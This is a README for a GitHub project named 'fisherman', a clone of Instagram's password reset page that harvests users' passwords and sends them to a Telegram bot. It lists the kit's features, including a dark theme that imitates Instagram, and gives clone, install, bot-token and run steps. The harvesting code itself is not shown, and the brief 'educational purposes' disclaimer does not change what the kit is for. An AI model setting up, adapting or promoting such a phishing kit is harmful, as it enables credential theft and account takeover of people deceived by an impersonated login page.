#  Instagram Phishing Demo 2025

This project is a **sample Instagram phishing page clone**  It demonstrates how attackers might design phishing pages and exfiltrate user credentials via Telegram bots.

---

## ⚠️ Legal Disclaimer

> This repository is intended **solely for educational purposes**.  
> **Do not use** this code to perform unauthorized access, deception, or data theft.  
> Misuse of this code **can result in legal consequences**.

---

## 🧩 Features

- 🎭 Fake Instagram password reset form
- 🕵️ Logs submitted "old passwords"
- 🚀 Sends credentials directly to a Telegram bot
- 🌓 Dark theme mimicking Instagram UI
- 📱 Mobile responsive

---

## 📁 Folder Structure

```s
fisherman/
├── public/
│   ├── index.html
│   └── style.css
├── .env.example
├── index.js
├── README.md
├── package.json
└── LICENSE
```

---

## 🔧 Setup & Run Locally

### 1. Clone the Repository

```bash
git clone https://github.com/00nx/fisherman.git
```
```bash
cd fisherman
```
```bash
npm install
```
Rename .env.example to .env and fill in your credentials:
```bash

TELEGRAM_BOT_TOKEN=123456:ABCDEF...
TELEGRAM_CHANNEL_ID=@yourchannel_or_chatid
```
```bash
node index.js
```


Access it at http://localhost:3000.


